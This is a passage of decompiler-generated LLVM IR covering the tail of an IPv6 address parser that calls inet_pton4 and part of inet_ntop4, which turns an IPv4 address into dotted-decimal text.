  %v3_8056423 = call i32 @inet_pton4(i32 %v0_8056401, i32 %v0_8056400, i32 %v0_80563ff)
  store i32 %v3_8056423, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80565c0

dec_label_pc_805642d:                             ; preds = %dec_label_pc_8056412
  %v2_8056432 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8056432, i32* %eax.global-to-local, align 4
  %tmp60 = bitcast i32* %stack_var_-32 to i8*
  %v5_8056437 = call i32 @__GI_memset(i8* %tmp60, i32 0, i32 16)
  store i32 %v5_8056437, i32* @ebx, align 4
  %v2_805643e = add i32 %v5_8056437, 16
  store i32 %v2_805643e, i32* %eax.global-to-local, align 4
  %v0_8056448 = load i32, i32* @edi, align 4
  %v1_8056448 = inttoptr i32 %v0_8056448 to i8*
  %v2_8056448 = load i8, i8* %v1_8056448, align 1
  %v11_8056448 = icmp eq i8 %v2_8056448, 58
  %v1_805644b = icmp eq i1 %v11_8056448, false
  br i1 %v1_805644b, label %dec_label_pc_80564de, label %dec_label_pc_805644d

dec_label_pc_805644d:                             ; preds = %dec_label_pc_805642d
  %v1_805644d = add i32 %v0_8056448, 1
  store i32 %v1_805644d, i32* @edi, align 4
  %v1_805644e = inttoptr i32 %v1_805644d to i8*
  %v2_805644e = load i8, i8* %v1_805644e, align 1
  %v11_805644e = icmp eq i8 %v2_805644e, 58
  %v1_8056451 = icmp eq i1 %v11_805644e, false
  br i1 %v1_8056451, label %dec_label_pc_80565be, label %dec_label_pc_80564de

dec_label_pc_8056465:                             ; preds = %dec_label_pc_805651e
  %v0_8056466 = load i32, i32* @edi, align 4
  %v1_8056466 = add i32 %v0_8056466, 1
  store i32 %v1_8056466, i32* @edi, align 4
  %v4_805646e = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8061794.801, i32 0, i32 0), i32 %v2_8056525)
  store i32 %v4_805646e, i32* %eax.global-to-local, align 4
  %v1_8056476 = icmp eq i32 %v4_805646e, 0
  br i1 %v1_8056476, label %dec_label_pc_8056495, label %dec_label_pc_805647a

dec_label_pc_805647a:                             ; preds = %dec_label_pc_8056465
  %v0_805647a = load i32, i32* @ebp, align 4
  %v2_805647a = mul i32 %v0_805647a, 16
  %v1_805647d = add i32 %v4_805646e, -134616980
  store i32 %v1_805647d, i32* %eax.global-to-local, align 4
  %v2_8056482 = or i32 %v2_805647a, %v1_805647d
  store i32 %v2_8056482, i32* @ebp, align 4
  %tmp = icmp ult i32 %v2_8056482, 65536
  br i1 %tmp, label %dec_label_pc_805647a.dec_label_pc_805651e.outer_crit_edge, label %dec_label_pc_80565be

dec_label_pc_805647a.dec_label_pc_805651e.outer_crit_edge: ; preds = %dec_label_pc_805647a
  %v0_805651e.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805651e.outer

dec_label_pc_805651e.outer:                       ; preds = %dec_label_pc_805647a.dec_label_pc_805651e.outer_crit_edge, %dec_label_pc_80564de
  %v0_805651e.pre = phi i32 [ %v0_805651e.pre.pre, %dec_label_pc_805647a.dec_label_pc_805651e.outer_crit_edge ], [ %stack_var_-36.0.in, %dec_label_pc_80564de ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_805647a.dec_label_pc_805651e.outer_crit_edge ], [ %stack_var_-44.0, %dec_label_pc_80564de ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_805647a.dec_label_pc_805651e.outer_crit_edge ], [ %stack_var_-36.0, %dec_label_pc_80564de ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_805647a.dec_label_pc_805651e.outer_crit_edge ], [ 0, %dec_label_pc_80564de ]
  %v4_805649a = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_805649f = icmp eq i1 %v4_805649a, false
  br label %dec_label_pc_805651e

dec_label_pc_8056495:                             ; preds = %dec_label_pc_8056465
  %v0_8056495 = load i32, i32* @esi, align 4
  %v9_8056495 = icmp eq i32 %v0_8056495, 58
  %v1_8056498 = icmp eq i1 %v9_8056495, false
  br i1 %v1_8056498, label %dec_label_pc_80564ea, label %dec_label_pc_805649a

dec_label_pc_805649a:                             ; preds = %dec_label_pc_8056495
  br i1 %v1_805649f, label %dec_label_pc_80564b6, label %dec_label_pc_80564a1

dec_label_pc_80564a1:                             ; preds = %dec_label_pc_805649a
  %v5_80564a1 = icmp eq i8* %stack_var_-44.1, null
  %v1_80564a6 = icmp eq i1 %v5_80564a1, false
  br i1 %v1_80564a6, label %dec_label_pc_80565be, label %dec_label_pc_80564ac

dec_label_pc_80564ac:                             ; preds = %dec_label_pc_80564a1
  %v0_80564ac = load i32, i32* @ebx, align 4
  %v5_80564ac = inttoptr i32 %v0_80564ac to i8*
  %v0_80564b0 = load i32, i32* @edi, align 4
  %v5_80564b0 = inttoptr i32 %v0_80564b0 to i8*
  br label %dec_label_pc_805651e

dec_label_pc_80564b6:                             ; preds = %dec_label_pc_805649a
  %v0_80564b6 = load i32, i32* @edi, align 4
  %v1_80564b6 = inttoptr i32 %v0_80564b6 to i8*
  %v2_80564b6 = load i8, i8* %v1_80564b6, align 1
  %v3_80564b6 = icmp eq i8 %v2_80564b6, 0
  br i1 %v3_80564b6, label %dec_label_pc_80565be, label %dec_label_pc_80564bf

dec_label_pc_80564bf:                             ; preds = %dec_label_pc_80564b6
  %v0_80564bf = load i32, i32* @ebx, align 4
  %v1_80564bf = add i32 %v0_80564bf, 2
  store i32 %v1_80564bf, i32* @edx, align 4
  %v6_80564c6 = icmp ugt i32 %v1_80564bf, %v2_805643e
  br i1 %v6_80564c6, label %dec_label_pc_80565be, label %dec_label_pc_80564cc

dec_label_pc_80564cc:                             ; preds = %dec_label_pc_80564bf
  %v0_80564cc = load i32, i32* @ebp, align 4
  %v2_80564ce = udiv i32 %v0_80564cc, 256
  %v4_80564ce = trunc i32 %v2_80564ce to i8
  %v3_80564d1 = inttoptr i32 %v0_80564bf to i8*
  store i8 %v4_80564ce, i8* %v3_80564d1, align 1
  %v0_80564d3 = load i32, i32* @ebp, align 4
  store i32 %v0_80564d3, i32* %eax.global-to-local, align 4
  %v1_80564d5 = trunc i32 %v0_80564d3 to i8
  %v2_80564d5 = load i32, i32* @ebx, align 4
  %v3_80564d5 = add i32 %v2_80564d5, 1
  %v4_80564d5 = inttoptr i32 %v3_80564d5 to i8*
  store i8 %v1_80564d5, i8* %v4_80564d5, align 1
  %v0_80564d8 = load i32, i32* @edx, align 4
  store i32 %v0_80564d8, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80564de

dec_label_pc_80564de:                             ; preds = %dec_label_pc_805642d, %dec_label_pc_805644d, %dec_label_pc_80564cc
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_80564cc ], [ %v1_805644d, %dec_label_pc_805644d ], [ %v0_8056448, %dec_label_pc_805642d ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_80564cc ], [ null, %dec_label_pc_805644d ], [ null, %dec_label_pc_805642d ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805651e.outer

dec_label_pc_80564ea:                             ; preds = %dec_label_pc_8056495
  %v9_80564ea = icmp eq i32 %v0_8056495, 46
  %v1_80564ed = icmp eq i1 %v9_80564ea, false
  br i1 %v1_80564ed, label %dec_label_pc_80565be, label %dec_label_pc_80564f3

dec_label_pc_80564f3:                             ; preds = %dec_label_pc_80564ea
  %v0_80564f3 = load i32, i32* @ebx, align 4
  %v1_80564f3 = add i32 %v0_80564f3, 4
  store i32 %v1_80564f3, i32* @esi, align 4
  %v6_80564fa = icmp ugt i32 %v1_80564f3, %v2_805643e
  br i1 %v6_80564fa, label %dec_label_pc_80565be, label %dec_label_pc_8056500

dec_label_pc_8056500:                             ; preds = %dec_label_pc_80564f3
  %v4_8056500 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_8056500, i32* @eax, align 4
  store i32 %v0_80564f3, i32* @edx, align 4
  store i32 %v1_80564f3, i32* @ebx, align 4
  %v2_8056508 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8056508 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_8056508, i32 %v2_805643e)
  store i32 %v5_8056508, i32* %eax.global-to-local, align 4
  %tmp61 = icmp slt i32 %v5_8056508, 1
  %tmp62 = icmp eq i1 %tmp61, false
  br i1 %tmp62, label %dec_label_pc_8056555, label %dec_label_pc_80565be

dec_label_pc_805651e:                             ; preds = %dec_label_pc_805651e.outer, %dec_label_pc_80564ac
  %v0_805651e = phi i32 [ %v0_80564b0, %dec_label_pc_80564ac ], [ %v0_805651e.pre, %dec_label_pc_805651e.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_80564ac, %dec_label_pc_80564ac ], [ %stack_var_-44.1.ph, %dec_label_pc_805651e.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_80564b0, %dec_label_pc_80564ac ], [ %stack_var_-36.1.ph, %dec_label_pc_805651e.outer ]
  %v1_805651e = inttoptr i32 %v0_805651e to i8*
  %v2_805651e = load i8, i8* %v1_805651e, align 1
  %v3_805651e = sext i8 %v2_805651e to i32
  store i32 %v3_805651e, i32* %eax.global-to-local, align 4
  %v2_8056525 = call i32 @__GI_tolower(i32 %v3_805651e)
  store i32 %v2_8056525, i32* %eax.global-to-local, align 4
  %v1_805652d = icmp eq i32 %v2_8056525, 0
  store i32 %v2_8056525, i32* @esi, align 4
  %v1_8056531 = icmp eq i1 %v1_805652d, false
  br i1 %v1_8056531, label %dec_label_pc_8056465, label %dec_label_pc_8056537

dec_label_pc_8056537:                             ; preds = %dec_label_pc_805651e
  br i1 %v4_805649a, label %dec_label_pc_8056555, label %dec_label_pc_805653e

dec_label_pc_805653e:                             ; preds = %dec_label_pc_8056537
  %v0_805653e = load i32, i32* @ebx, align 4
  %v1_805653e = add i32 %v0_805653e, 2
  store i32 %v1_805653e, i32* @edx, align 4
  %v6_8056545 = icmp ugt i32 %v1_805653e, %v2_805643e
  br i1 %v6_8056545, label %dec_label_pc_80565be, label %dec_label_pc_8056547

dec_label_pc_8056547:                             ; preds = %dec_label_pc_805653e
  %v0_8056547 = load i32, i32* @ebp, align 4
  %v2_8056549 = udiv i32 %v0_8056547, 256
  %v4_8056549 = trunc i32 %v2_8056549 to i8
  %v3_805654c = inttoptr i32 %v0_805653e to i8*
  store i8 %v4_8056549, i8* %v3_805654c, align 1
  %v0_805654e = load i32, i32* @ebp, align 4
  store i32 %v0_805654e, i32* %eax.global-to-local, align 4
  %v1_8056550 = trunc i32 %v0_805654e to i8
  %v2_8056550 = load i32, i32* @ebx, align 4
  %v3_8056550 = add i32 %v2_8056550, 1
  %v4_8056550 = inttoptr i32 %v3_8056550 to i8*
  store i8 %v1_8056550, i8* %v4_8056550, align 1
  %v0_8056553 = load i32, i32* @edx, align 4
  store i32 %v0_8056553, i32* @ebx, align 4
  br label %dec_label_pc_8056555

dec_label_pc_8056555:                             ; preds = %dec_label_pc_8056537, %dec_label_pc_8056500, %dec_label_pc_8056547
  %v4_8056555 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8056555 = icmp eq i8* %stack_var_-44.1, null
  %v0_805658d.pre = load i32, i32* @ebx, align 4
  br i1 %v5_8056555, label %dec_label_pc_805658d, label %dec_label_pc_805655c

dec_label_pc_805655c:                             ; preds = %dec_label_pc_8056555
  store i32 1, i32* @esi, align 4
  %v6_8056563 = sub i32 %v0_805658d.pre, %v4_8056555
  store i32 %v6_8056563, i32* @edi, align 4
  %v16_8056567 = icmp eq i32 %v0_805658d.pre, %v2_805643e
  %v1_805656b = icmp eq i1 %v16_8056567, false
  br i1 %v1_805656b, label %dec_label_pc_8056585.preheader, label %dec_label_pc_80565be

dec_label_pc_8056585.preheader:                   ; preds = %dec_label_pc_805655c
  %v3_805658588 = inttoptr i32 %v6_8056563 to i8*
  %v9_805658797 = icmp slt i8* %v3_805658588, inttoptr (i32 1 to i8*)
  br i1 %v9_805658797, label %dec_label_pc_8056589, label %dec_label_pc_805656f

dec_label_pc_805656f:                             ; preds = %dec_label_pc_8056585.preheader, %dec_label_pc_805656f
  %v0_805657d99 = phi i32 [ %v0_8056585.pre, %dec_label_pc_805656f ], [ 1, %dec_label_pc_8056585.preheader ]
  %v0_805656f98 = phi i32 [ %v1_8056585.pre, %dec_label_pc_805656f ], [ %v6_8056563, %dec_label_pc_8056585.preheader ]
  %v2_8056575 = sub i32 %v0_805656f98, %v0_805657d99
  %v6_8056577 = add i32 %v2_8056575, %v4_8056555
  store i32 %v6_8056577, i32* %eax.global-to-local, align 4
  %v2_805657b = sub i32 %v2_805643e, %v0_805657d99
  store i32 %v2_805657b, i32* @ecx, align 4
  %v1_805657d = add i32 %v0_805657d99, 1
  store i32 %v1_805657d, i32* @esi, align 4
  %v1_805657e = inttoptr i32 %v6_8056577 to i8*
  %v2_805657e = load i8, i8* %v1_805657e, align 1
  %v3_805657e = zext i8 %v2_805657e to i32
  %v4_805657e = load i32, i32* @edx, align 4
  %v5_805657e = and i32 %v4_805657e, -256
  %v6_805657e = or i32 %v5_805657e, %v3_805657e
  store i32 %v6_805657e, i32* @edx, align 4
  %v3_8056580 = inttoptr i32 %v2_805657b to i8*
  store i8 %v2_805657e, i8* %v3_8056580, align 1
  %v0_8056582 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056582 = inttoptr i32 %v0_8056582 to i8*
  store i8 0, i8* %v1_8056582, align 1
  %v0_8056585.pre = load i32, i32* @esi, align 4
  %v1_8056585.pre = load i32, i32* @edi, align 4
  %v2_8056585 = inttoptr i32 %v0_8056585.pre to i8*
  %v3_8056585 = inttoptr i32 %v1_8056585.pre to i8*
  %v9_8056587 = icmp sgt i8* %v2_8056585, %v3_8056585
  br i1 %v9_8056587, label %dec_label_pc_8056589, label %dec_label_pc_805656f

dec_label_pc_8056589:                             ; preds = %dec_label_pc_805656f, %dec_label_pc_8056585.preheader
  br label %dec_label_pc_805658d

dec_label_pc_805658d:                             ; preds = %dec_label_pc_8056555, %dec_label_pc_8056589
  %v0_805658d = phi i32 [ %v2_805643e, %dec_label_pc_8056589 ], [ %v0_805658d.pre, %dec_label_pc_8056555 ]
  %v16_805658d = icmp eq i32 %v0_805658d, %v2_805643e
  %v1_8056591 = icmp eq i1 %v16_805658d, false
  br i1 %v1_8056591, label %dec_label_pc_80565be, label %dec_label_pc_8056593

dec_label_pc_8056593:                             ; preds = %dec_label_pc_805658d
  store i32 %v2_8056432, i32* %eax.global-to-local, align 4
  %tmp63 = inttoptr i32 %arg3 to i16*
  %v5_805659f = call i32 @memcpy(i16* %tmp63, i32 %v2_8056432, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80565c0

dec_label_pc_80565ae:                             ; preds = %dec_label_pc_8056412
  %v1_80565ae = call i32 @__errno_location(i32 %v0_8056401)
  %v1_80565b3 = inttoptr i32 %v1_80565ae to i32*
  store i32 97, i32* %v1_80565b3, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80565c0

dec_label_pc_80565be:                             ; preds = %dec_label_pc_80564bf, %dec_label_pc_80564b6, %dec_label_pc_805647a, %dec_label_pc_80564a1, %dec_label_pc_805655c, %dec_label_pc_8056500, %dec_label_pc_805658d, %dec_label_pc_805653e, %dec_label_pc_80564f3, %dec_label_pc_80564ea, %dec_label_pc_805644d
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80565c0

dec_label_pc_80565c0:                             ; preds = %dec_label_pc_80565ae, %dec_label_pc_8056593, %dec_label_pc_805641d, %dec_label_pc_80565be
  %v0_80565c7 = phi i32 [ -1, %dec_label_pc_80565ae ], [ 1, %dec_label_pc_8056593 ], [ %v3_8056423, %dec_label_pc_805641d ], [ 0, %dec_label_pc_80565be ]
  store i32 %v0_8056401, i32* @ebx, align 4
  store i32 %v0_8056400, i32* @esi, align 4
  store i32 %v0_80563ff, i32* @edi, align 4
  store i32 %v0_80563fe, i32* @ebp, align 4
  ret i32 %v0_80565c7

; uselistorder directives
  uselistorder i32 %v1_8056585.pre, { 1, 0 }
  uselistorder i32 %v0_8056585.pre, { 1, 0 }
  uselistorder i32 %v0_805657d99, { 2, 1, 0 }
  uselistorder i32 %v0_805658d.pre, { 1, 0, 2 }
  uselistorder i32 %v2_8056525, { 1, 2, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v2_805643e, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_8056401, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 6, 2, 3, 4, 5, 1 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_80565c0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80565be, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_805658d, { 1, 0 }
  uselistorder label %dec_label_pc_805656f, { 1, 0 }
  uselistorder label %dec_label_pc_8056555, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805651e, { 1, 0 }
  uselistorder label %dec_label_pc_80564de, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805651e.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-56 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_80565c9 = load i32, i32* @edi, align 4
  %v0_80565ca = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v15_80565ce = ptrtoint i32* %stack_var_-76 to i32
  %v0_80565d1 = load i32, i32* @eax, align 4
  %v3_80565d5 = and i32 %v0_80565d1, -65536
  %v2_80565db = ptrtoint i32* %stack_var_-31 to i32
  store i1 false, i1* @df, align 1
  %v0_80565e0 = load i32, i32* @edx, align 4
  %v5_80565e0 = inttoptr i32 %v0_80565e0 to i8*
  store i8* %v5_80565e0, i8** %stack_var_-56, align 4
  %v0_80565e4 = load i32, i32* @ecx, align 4
  store i32 %v3_80565d5, i32* %stack_var_-33, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_80565ef = add i32 %v2_80565db, 4
  store i32 %v6_80565ef, i32* %edi.global-to-local, align 4
  %v2_80565f0 = inttoptr i32 %v6_80565ef to i32*
  store i32 0, i32* %v2_80565f0, align 4
  %v3_80565f0 = load i32, i32* %edi.global-to-local, align 4
  %v6_80565f0 = add i32 %v3_80565f0, 4
  store i32 %v6_80565f0, i32* %edi.global-to-local, align 4
  %v0_80565f1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80565f1 = inttoptr i32 %v6_80565f0 to i32*
  store i32 %v0_80565f1, i32* %v2_80565f1, align 4
  %v3_80565f1 = load i32, i32* %edi.global-to-local, align 4
  %v6_80565f1 = add i32 %v3_80565f1, 4
  store i32 %v6_80565f1, i32* %edi.global-to-local, align 4
  %v0_80565f2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80565f2 = trunc i32 %v0_80565f2 to i16
  %v3_80565f2 = inttoptr i32 %v6_80565f1 to i16*
  store i16 %v1_80565f2, i16* %v3_80565f2, align 2
  %v4_80565f2 = load i32, i32* %edi.global-to-local, align 4
  %v7_80565f2 = add i32 %v4_80565f2, 2
  %v0_80565f4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80565f4 = trunc i32 %v0_80565f4 to i8
  %v3_80565f4 = inttoptr i32 %v7_80565f2 to i8*
  store i8 %v1_80565f4, i8* %v3_80565f4, align 1
  store i32 0, i32* %edi.global-to-local, align 4
  %v0_805668f30 = load i32, i32* @esi, align 4
  %v10_805668f36 = icmp eq i32 %v0_805668f30, 3
  store i1 %v10_805668f36, i1* %zf.global-to-local, align 1
  %v7_805669238 = icmp sgt i32 %v0_805668f30, 3
  br i1 %v7_805669238, label %dec_label_pc_8056698, label %dec_label_pc_80565fc

dec_label_pc_80565fc:                             ; preds = %dec_label_pc_805666f, %entry
  %v3_8056612 = phi i32 [ 0, %entry ], [ %v1_8056698.pre, %dec_label_pc_805666f ]
  %v0_805668f39 = phi i32 [ %v0_805668f30, %entry ], [ %v0_805668f, %dec_label_pc_805666f ]
  %v2_8056602 = add i32 %v0_805668f39, %v0_80565d1
  %v12_8056602 = icmp eq i32 %v2_8056602, 0
  store i1 %v12_8056602, i1* %zf.global-to-local, align 1
  store i32 %v2_8056602, i32* %ebp.global-to-local, align 4
  %v1_8056604 = inttoptr i32 %v2_8056602 to i8*
  %v2_8056604 = load i8, i8* %v1_8056604, align 1
  %v3_8056604 = zext i8 %v2_8056604 to i32
  %v4_8056604 = load i32, i32* @edx, align 4
  %v5_8056604 = and i32 %v4_8056604, -65536
  %v6_8056604 = or i32 %v5_8056604, %v3_8056604
  store i32 %v6_8056604, i32* %edx.global-to-local, align 4
  %div8 = udiv i8 %v2_8056604, 100
  %v6_805660b = zext i8 %div8 to i32
  %tmp24 = urem i8 %v2_8056604, 100
  %v12_805660b = zext i8 %tmp24 to i32
  %v14_805660b = mul nuw nsw i32 %v12_805660b, 256
  %v15_805660b = or i32 %v6_805660b, %v5_8056604
  %v16_805660b = or i32 %v15_805660b, %v14_805660b
  store i32 %v16_805660b, i32* %eax.global-to-local, align 4
  %v2_805660f = or i8 %div8, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_8056612 = load i32, i32* @esp, align 4
  %v4_8056612 = add i32 %v2_8056612, 43
  %v5_8056612 = add i32 %v4_8056612, %v3_8056612
  %v6_8056612 = inttoptr i32 %v5_8056612 to i8*
  store i8 %v2_805660f, i8* %v6_8056612, align 1
  %v0_8056616 = load i32, i32* %edi.global-to-local, align 4
  %v1_8056616 = add i32 %v0_8056616, 1
  store i32 %v0_8056616, i32* @ecx, align 4
  %v0_805661f = load i32, i32* @esp, align 4
  %v2_805661f = add i32 %v0_8056616, 43
  %v3_805661f = add i32 %v2_805661f, %v0_805661f
  %v4_805661f = inttoptr i32 %v3_805661f to i8*
  %v5_805661f = load i8, i8* %v4_805661f, align 1
  %v11_805661f = icmp eq i8 %v5_805661f, 48
  store i1 %v11_805661f, i1* %zf.global-to-local, align 1
  %v1_8056624 = icmp eq i1 %v11_805661f, false
  %v0_805664e = load i32, i32* %edx.global-to-local, align 4
  br i1 %v1_8056624, label %dec_label_pc_805664c, label %dec_label_pc_8056626

dec_label_pc_8056626:                             ; preds = %dec_label_pc_80565fc
  %v3_805662a = trunc i32 %v0_805664e to i16
  %v5_805662a = udiv i16 %v3_805662a, 10
  store i32 10, i32* %ebx.global-to-local, align 4
  %tmp = urem i16 %v5_805662a, 256
  %tmp42 = urem i16 %tmp, 10
  %tmp25 = zext i16 %tmp42 to i32
  store i32 %tmp25, i32* %edx.global-to-local, align 4
  %v1_805663c = trunc i16 %tmp42 to i8
  %v2_805663c = or i8 %v1_805663c, 48
  %v12_805663c = zext i8 %v2_805663c to i32
  store i32 %v12_805663c, i32* %eax.global-to-local, align 4
  %v7_805663e = icmp eq i8 %v1_805663c, 0
  store i1 %v7_805663e, i1* %zf.global-to-local, align 1
  store i8 %v2_805663c, i8* %v4_805661f, align 1
  %v0_8056644 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8056644, label %dec_label_pc_805666f, label %dec_label_pc_8056646

dec_label_pc_8056646:                             ; preds = %dec_label_pc_8056626
  store i32 %v1_8056616, i32* @ecx, align 4
  br label %dec_label_pc_805666f

dec_label_pc_805664c:                             ; preds = %dec_label_pc_80565fc
  store i32 %v1_8056616, i32* %ebx.global-to-local, align 4
  %v3_8056654 = trunc i32 %v0_805664e to i16
  %v5_8056654 = udiv i16 %v3_8056654, 10
  %tmp43 = urem i16 %v5_8056654, 256
  %tmp44 = urem i16 %tmp43, 10
  %tmp26 = zext i16 %tmp44 to i32
  store i32 %tmp26, i32* %edx.global-to-local, align 4
  %v1_8056664 = add i32 %v0_8056616, 2
  store i32 %v1_8056664, i32* @ecx, align 4
  %v1_8056669 = trunc i16 %tmp44 to i8
  %v2_8056669 = or i8 %v1_8056669, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_8056669 = zext i8 %v2_8056669 to i32
  store i32 %v12_8056669, i32* %eax.global-to-local, align 4
  %v4_805666b = add i32 %v0_8056616, 44
  %v5_805666b = add i32 %v4_805666b, %v0_805661f
  %v6_805666b = inttoptr i32 %v5_805666b to i8*
  store i8 %v2_8056669, i8* %v6_805666b, align 1
  br label %dec_label_pc_805666f

dec_label_pc_805666f:                             ; preds = %dec_label_pc_8056626, %dec_label_pc_8056646, %dec_label_pc_805664c
  %v0_805666f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805666f = inttoptr i32 %v0_805666f to i8*
  %v2_805666f = load i8, i8* %v1_805666f, align 1
  %v3_805666f = zext i8 %v2_805666f to i32
  store i32 %v3_805666f, i32* %eax.global-to-local, align 4
  %v0_8056678 = load i32, i32* @esi, align 4
  %v1_8056678 = add i32 %v0_8056678, 1
  store i32 %v1_8056678, i32* @esi, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_805667d = load i32, i32* @esp, align 4
  %v1_805667d = load i32, i32* @ecx, align 4
  %v2_805667d = add i32 %v0_805667d, 44
  %v3_805667d = add i32 %v2_805667d, %v1_805667d
  %v4_805667d = inttoptr i32 %v3_805667d to i8*
  store i8 46, i8* %v4_805667d, align 1
  %v0_8056682 = load i32, i32* @ecx, align 4
  %v1_8056682 = add i32 %v0_8056682, 2
  store i32 %v1_8056682, i32* %edi.global-to-local, align 4
  %v0_8056685 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056685 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056685 = zext i32 %v1_8056685 to i64
  %v3_8056685 = load i32, i32* %edx.global-to-local, align 4
  %v4_8056685 = zext i32 %v3_8056685 to i64
  %v5_8056685 = mul nuw i64 %v4_8056685, 4294967296
  %v6_8056685 = or i64 %v5_8056685, %v2_8056685
  %v7_8056685 = zext i32 %v0_8056685 to i64
  %v8_8056685 = udiv i64 %v6_8056685, %v7_8056685
  %v9_8056685 = trunc i64 %v8_8056685 to i32
  %v10_8056685 = urem i64 %v6_8056685, %v7_8056685
  %v11_8056685 = trunc i64 %v10_8056685 to i32
  store i32 %v11_8056685, i32* @edx, align 4
  %v3_8056687 = and i32 %v9_8056685, -256
  %v1_8056689 = trunc i64 %v10_8056685 to i8
  %v2_8056689 = add i8 %v1_8056689, 48
  %v12_8056689 = zext i8 %v2_8056689 to i32
  %v15_8056689 = or i32 %v12_8056689, %v3_8056687
  store i32 %v15_8056689, i32* %eax.global-to-local, align 4
  %v2_805668b = load i32, i32* @esp, align 4
  %v4_805668b = add i32 %v0_8056682, 43
  %v5_805668b = add i32 %v4_805668b, %v2_805668b
  %v6_805668b = inttoptr i32 %v5_805668b to i8*
  store i8 %v2_8056689, i8* %v6_805668b, align 1
  %v0_805668f = load i32, i32* @esi, align 4
  %v10_805668f = icmp eq i32 %v0_805668f, 3
  store i1 %v10_805668f, i1* %zf.global-to-local, align 1
  %v7_8056692 = icmp sgt i32 %v0_805668f, 3
  %v1_8056698.pre = load i32, i32* %edi.global-to-local, align 4
  br i1 %v7_8056692, label %dec_label_pc_8056698, label %dec_label_pc_80565fc

dec_label_pc_8056698:                             ; preds = %dec_label_pc_805666f, %entry
  %v1_8056698 = phi i32 [ 0, %entry ], [ %v1_8056698.pre, %dec_label_pc_805666f ]
  %v0_8056698 = load i32, i32* @esp, align 4
  %v2_8056698 = add i32 %v0_8056698, 42
  %v3_8056698 = add i32 %v2_8056698, %v1_8056698
  %v4_8056698 = inttoptr i32 %v3_8056698 to i8*
  store i8 0, i8* %v4_8056698, align 1
  %v0_805669d = load i32, i32* @esp, align 4
  %v9_805669d = icmp eq i32 %v0_805669d, 12
  store i1 %v9_805669d, i1* %zf.global-to-local, align 1
  %tmp27 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp27, i8** %stack_var_-92, align 4
  %v3_80566a5 = call i32 @strlen(i8* %tmp27)
  store i32 %v3_80566a5, i32* @eax, align 4
  %v15_80566ad = icmp eq i32 %v3_80566a5, %v0_80565e4
  store i1 %v15_80566ad, i1* %zf.global-to-local, align 1
  %tmp45 = icmp ugt i32 %v3_80566a5, %v0_80565e4
  br i1 %tmp45, label %dec_label_pc_80566b3, label %dec_label_pc_80566c2

dec_label_pc_80566b3:                             ; preds = %dec_label_pc_8056698
  %v0_80566b3 = load i8*, i8** %stack_var_-92, align 4
  %v1_80566b3 = ptrtoint i8* %v0_80566b3 to i32
  %v2_80566b3 = call i32 @__errno_location(i32 %v1_80566b3)
  %v1_80566b8 = inttoptr i32 %v2_80566b3 to i32*
